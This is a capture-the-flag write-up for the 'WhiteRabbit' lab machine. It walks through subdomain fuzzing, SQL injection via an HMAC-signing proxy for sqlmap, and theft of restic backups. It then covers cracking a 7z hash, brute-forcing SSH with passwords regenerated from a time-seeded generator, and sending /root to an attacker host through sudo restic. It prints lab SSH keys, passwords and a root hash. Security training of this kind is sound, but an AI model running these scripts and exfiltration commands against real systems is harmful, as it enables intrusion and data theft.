1, Recon
port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Page check
![](images/Pasted%20image%2020250408005946.png)
By using the ffuf to enumerate the basic web-content, there is nothing we can found
```
ffuf -u http://whiterabbit.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 6109, Words: 1815, Lines: 117, Duration: 59ms]
index.html              [Status: 200, Size: 6109, Words: 1815, Lines: 117, Duration: 8ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1834 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

```

Let's try to enumerate the valid sub-domain here.
```
ffuf -u http://whiterabbit.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.whiterabbit.htb" -fs 0

Then we successfully get he valid sub-domain here.
status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 20ms]

```
Then we can successfully get the login page from this sub-domain here.
![](images/Pasted%20image%2020250408010426.png)'But we don't have any valid credit here, so I would want check is there any vulnerable services here
```
whatweb http://status.whiterabbit.htb/dashboard                          
http://status.whiterabbit.htb/dashboard [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.10.11.63], Script[module], Title[Uptime Kuma], X-Frame-Options[SAMEORIGIN]

```
Continue to enumerate the web-contents of this sub-domain
```
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 52ms]
favicon.ico             [Status: 200, Size: 15086, Words: 14, Lines: 4, Duration: 21ms]
robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2, Duration: 44ms]
screenshots             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 40ms]
upload                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 36ms]
status[Status: 200, Size: 0, Words: 7, Lines: 11, Duration: 36ms]
```
Then we continue to check the `/status`, then we continue to enumerate the web-contents, we can get one target here. `/status/temp`
`http://status.whiterabbit.htb/status/`
![](images/Pasted%20image%2020250408012549.png)
`http://status.whiterabbit.htb/status/temp`
![](images/Pasted%20image%2020250408012427.png)
Let's add these sub-domains into `/etc/hosts`and check what happened to them
`http://ddb09a8558c9.whiterabbit.htb/login?next=%2F`
![](images/Pasted%20image%2020250408012824.png)
`http://a668910b5514e.whiterabbit.htb/`
![](images/Pasted%20image%2020250408012848.png)
Then we can get these new services, firstly we don't have any credits here, so I would start with the wiki page.
http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
This page has explain `http://ddb09a8558c9.whiterabbit.htb/`
This page explains how the site works and the various implementation details.
![](images/Pasted%20image%2020250408013743.png)
Then summary this wiki post
```
Of course! Here's the key point summary in English, suitable for reports, executive briefs, or presentations:

---

### **Key Summary: Integrating Gophish with n8n for Automated Phishing Simulation Analysis**

#### ✅ **Background**
- **Gophish** is an open-source phishing simulation toolkit used to test and improve user awareness of phishing attacks.
- **n8n** is a workflow automation tool that can process incoming data from Gophish in real time, helping automate the tracking and scoring of user responses.

---

#### 🔗 **Core Integration Steps**

1. **Webhook Reception**
   - An n8n webhook node receives POST requests from Gophish.
   - Each request includes key event data: campaign ID, recipient email, and action type (e.g., link clicked).

2. **Security: Signature Verification**
   - Gophish adds an `x-gophish-signature` header using HMAC (Hash-based Message Authentication Code).
   - n8n verifies this signature using a shared secret key to ensure the data is authentic and untampered.
   - This protects against spoofed events and injection attacks (e.g., SQLi).

---

#### 🗃️ **Database Logic**

- **User Validation**: Confirms the user’s email exists in the internal database.
- **Phishing Score Update**: Adjusts user susceptibility scores based on behavior (e.g., clicking a link or submitting credentials).
- **Conditional Logic**: Uses branching to handle different actions appropriately.

---

#### 🐞 **Debugging and Error Handling**

- Includes a temporary debug node labeled **"DEBUG: REMOVE SOON"** to assist with troubleshooting during development.

---

#### ✅ **Benefits and Conclusion**

- **Automates** the processing of phishing simulation data, reducing manual effort and error.
- Enables **real-time response and scoring**, improving training effectiveness.
- Enhances organizational **cybersecurity posture** by identifying high-risk users quickly.
- As phishing threats become more sophisticated, such integrations will be critical for proactive defense and user training at scale.

---

Let me know if you’d like this formatted as a slide deck, technical documentation, or need code samples for the signature verification step!
```

So we need to find the valid HMAC hash here
By search `hmac` from the example json file, we can find that
```
{
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
```

Then we successfully get the `secret` here.
`3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`

![](images/Pasted%20image%2020250409224918.png)
By checking the sql query, we can find the basic sql-injection here.
![](images/Pasted%20image%2020250409230252.png)
The valid request here is working well
When we add some `"` into the query, the debug message of database would give us.
![](images/Pasted%20image%2020250409230354.png)

Let's make a script to help us to check the sql-injection here.
```
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import requests
import hmac
import hashlib
# Configuration
TARGET_HOST = "28efa8f7df.whiterabbit.htb"
TARGET_URL = f"http://{TARGET_HOST}"
HMAC_KEY = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
class GoPhishProxy(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the request body
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len)
        # Clean the path from possible full URLs or malformed inputs
        clean_path = urlparse(self.path).path
        full_url = f"{TARGET_URL}{clean_path}"
        # Calculate HMAC-SHA256 signature
        signature = hmac.new(HMAC_KEY, body, hashlib.sha256).hexdigest()
        # Prepare headers for forwarding
        forward_headers = {key: self.headers[key] for key in self.headers if key.lower() != 'host'}
        forward_headers['Host'] = TARGET_HOST
        forward_headers['x-gophish-signature'] = f"sha256={signature}"
        # Forward the request to the actual server
        try:
            response = requests.post(
                full_url,
                headers=forward_headers,
                data=body,
                allow_redirects=False,
                verify=False
            )
        except Exception as e:
            self.send_error(502, f"Proxy forwarding failed: {str(e)}")
            return
        # Respond back to sqlmap
        self.send_response(response.status_code)
        for k, v in response.headers.items():
            if k.lower() != 'content-encoding':
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(response.content)
        # Debug log
        print(f"[+] Forwarded to: {full_url}")
        print(f"    Signature: sha256={signature}")
        print(f"    Payload: {body.decode(errors='ignore')[:200]}")
if __name__ == "__main__":
    print("
GoPhish SQLmap Proxy running on http://127.0.0.1:8000")
    server = HTTPServer(('0.0.0.0', 8000), GoPhishProxy)
    server.serve_forever()
```



Or use the go script here
```
package main

import (
    "bytes"
    "crypto/hmac"
    "crypto/sha256"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "log"
    "net/http"
)

const (
    secret    = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
    webhookURL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
)

type Payload struct {
    CampaignID int    `json:"campaign_id"`
    Email      string `json:"email"`
    Message    string `json:"message"`
}

func calculateHMAC(payload Payload) string {
    jsonBytes, _ := json.Marshal(payload)
    h := hmac.New(sha256.New, []byte(secret))
    h.Write(jsonBytes)
    return hex.EncodeToString(h.Sum(nil))
}

func logRequest(r *http.Request) {
    clientIP := r.RemoteAddr
    method := r.Method
    uri := r.URL.RequestURI()
    protocol := r.Proto
    log.Printf("%s - - \"%s %s %s\" 200 -", clientIP, method, uri, protocol)
}

func handler(w http.ResponseWriter, r *http.Request) {
    logRequest(r)

    email := r.URL.Query().Get("q")
    if email == "" {
        http.Error(w, `{"error": "Missing 'q' query parameter for email"}`, http.StatusBadRequest)
        return
    }

    payload := Payload{
        CampaignID: 1,
        Email:      email,
        Message:    "Clicked Link",
    }

    signature := calculateHMAC(payload)

    jsonBytes, err := json.Marshal(payload)
    if err != nil {
        http.Error(w, `{"error": "Failed to encode payload"}`, http.StatusInternalServerError)
        return
    }

    req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonBytes))
    if err != nil {
        http.Error(w, `{"error": "Failed to create request"}`, http.StatusInternalServerError)
        return
    }

    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("x-gophish-signature", "hmac="+signature)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        http.Error(w, fmt.Sprintf(`{"error": "%s"}`, err.Error()), http.StatusInternalServerError)
        return
    }
    defer resp.Body.Close()

    io.Copy(w, resp.Body)
}

func main() {
    http.HandleFunc("/", handler)
    fmt.Println("Listening on http://localhost:12345")
    log.Fatal(http.ListenAndServe(":12345", nil))
}
```

Then we can run the sqlmap to check the sql-injection here.
```
sqlmap.req
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
Content-Type: application/json
User-Agent: sqlmap
Accept: */*
{"campaign_id":1,"email":"*","message":"Clicked Link"}

Is important to leave the request file without the x-gophish-signature header because the proxy will be adding that automatically

sqlmap -r sqlmap.req --proxy=http://127.0.0.1:8000 --batch --level=5 --risk=3 --threads=5
```
Then you can get dump of database.
We can get something interesting from table `command_log`
`uname -a、restic init、echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`

In this place, I would check the sql injection munally here
Firstly let's check schema name
![](images/Pasted%20image%2020250409230815.png)
Then we can successfully get the database name  `information_schema,phishing,temp`
![](images/Pasted%20image%2020250409230920.png)
Then let's try to dump all the databases
![](images/Pasted%20image%2020250409231129.png)
![](images/Pasted%20image%2020250409231236.png)
Then we can know there is a table `victims`with 2 columns `email,phishing_score`
That seems not like our target here, so let's try to check the other database `temp` here.
![](images/Pasted%20image%2020250409231422.png)
![](images/Pasted%20image%2020250409231543.png)
Then we can know there is a table `command_log` with 2 columns `id,command,date`, let's try to leak the data from this table.
![](images/Pasted%20image%2020250409231720.png)
![](images/Pasted%20image%2020250409231908.png)
![](images/Pasted%20image%2020250409232012.png)
![](images/Pasted%20image%2020250409232051.png)
![](images/Pasted%20image%2020250409232129.png)
![](images/Pasted%20image%2020250409232200.png)
By combining them, then we can get the what we want to get
`uname -a、restic init、echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`

we find two important commands here, a restic subdomain `75951e6ff.whiterabbit.htb` with password, and a hint for a password generator
```
❯ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd

❯ chmod 600 .restic_passwd

❯ export RESTIC_REPOSITORY="rest:http://75951e6ff.whiterabbit.htb"

❯ export RESTIC_PASSWORD_FILE=".restic_passwd"

❯ restic snapshots
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/redacted/.cache/restic
ID        Time                Host        Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit            [color=#4cea5e]/dev/shm/bob/ssh[/color]
------------------------------------------------------------------------
1 snapshots

❯ restic restore latest --target ./restored_data

```
There is a blocked 7z file here, but we can use `7z2hashcat` get the hash and crack the password
```
./7z2hashcat.pl bob.7z > bob.hash
hashcat -m 11600 bob.hash /usr/share/wordlists/rockyou.txt 

Then we get the password
bob:1q2w3e4r5t6y
Then we can successfully get the ssh credit
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----

From the config file, we get
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob

Then we can login by port 2222
```
Then by checking the `sudo -l`
```
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```
I can find the privileged access from `GTOBins`
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

So our payload would be 
`sudo restic backup -r "rest:http://10.10.16.16:12345/mystolenrepo" /root`

Let's exploit it
```
Attacter machine:
mkdir -p ~/rest-repo/mystolenrepo
/opt/rest-server/rest-server \
  --path ~/rest-repo \
  --listen :12345 \
  --no-auth

Target machine:
export RESTIC_PASSWORD=yourpassword
sudo restic init -r rest:http://10.10.16.16:12345/mystolenrepo
export RESTIC_PASSWORD=yourpassword
sudo restic backup -r rest:http://10.10.16.16:12345/mystolenrepo /root


Attcaker machine:
export RESTIC_REPOSITORY=rest:http://localhost:12345/mystolenrepo
export RESTIC_PASSWORD=yourpassword
restic snapshots
restic restore latest --target ./recovered
```
Then we can successfully get the ssh credit of `morpheus`
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----

```
Then we can get the shell as `morpheus`

We want to check `sudo -l`, but we did not have any credits of this user, so I would continue to enumerate the file system.
Then I found a interesting file `/opt/neo-password-generator/neo-password-generator`
It's a binary file and we can run it to check what is the output
```
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
f0mHXv2ZJNGTduO5q37N
```
It seems like a password of user `neo`, but I try to use it to login, but it did not work.

So I think I have to Decompile this binary file, in this I would like use `Ghidra`, `IDA pro` would be fun if you know how to use that.
![](images/Pasted%20image%2020250409232508.png)
```
undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
We can also change these pseudocode into C code
```
int main(void) {
    // Stack Canary 读取
    long stack_canary_saved = __stack_chk_guard;
    
    // 获取当前时间
    struct timeval t;
    gettimeofday(&t, NULL);
    long millis = t.tv_sec * 1000 + t.tv_usec / 1000;
    
    // 生成密码
    generate_password(millis);
    
    // 堆栈保护检查
    if (stack_canary_saved != __stack_chk_guard) {
        __stack_chk_fail();
    }
    return 0;
}

```
The main function of this code is to generate a password or passphrase based on the current time (millisecond level), in conjunction with the compiler's built-in stack protection mechanism.

From the database, we know that running the command `cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd to change the password is at 2024-08-30 14:40:42`. From the path we can also tell that this is user `neo`.

Next, let's try to write a complete password generator
```
#include <stdio.h>
#include <stdlib.h>

void generate_password(unsigned int seed) {
    // 1) 使用21字节缓冲：20个随机字符 + '\0'
    char password[21];
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    // 用传入的种子调用 srand
    srand(seed);

    // 2) 循环生成20个随机字符
    for (int i = 0; i < 20; i++) {
        int random_value = rand();
        password[i] = charset[random_value % 62];
    }

    // 3) 手动添加字符串终止符
    password[20] = '\0';

    // 打印结果
    printf("%s\n", password);
}

int main(void) {
    // 如果要确保乘法不溢出，可以使用 long long 或 unsigned long long
    // 这里演示使用 long long 进行计算，然后只取低32位给 srand()
    for (int add = 0; add <= 1000; add++) {
        long long fullSeed = (long long)1725028842 * 1000LL + add;
        // 仅将计算结果的低32位作为种子
        generate_password((unsigned int)(fullSeed));
    }
    return 0;
}
```
Then let's save them into a file and use hydra to crack the password of neo by using ssh.
```
hydra -l neo -P neo_password.txt ssh://10.10.11.63 -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-09 23:36:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1001 login tries (l:1/p:1001), ~63 tries per task
[DATA] attacking ssh://10.10.11.63:22/
[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-09 23:37:06
```
Then we finally get the password of `neo` `neo:WBSxhWgfnMiclrV4dqfj`
Let's try to ssh to this user.
We can check `sudo -l`
```
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:

```
We can just `sudo su` with the password of `neo` and get the root shell.



Root hash
`root:$y$j9T$Rx7IRKAooZBFEEKqpflWl1$fK0BeVoPRj.EwPj9sYKZMu.Ti0EmrFpmQQZmayCKdL/:19962:0:99999:7:::`
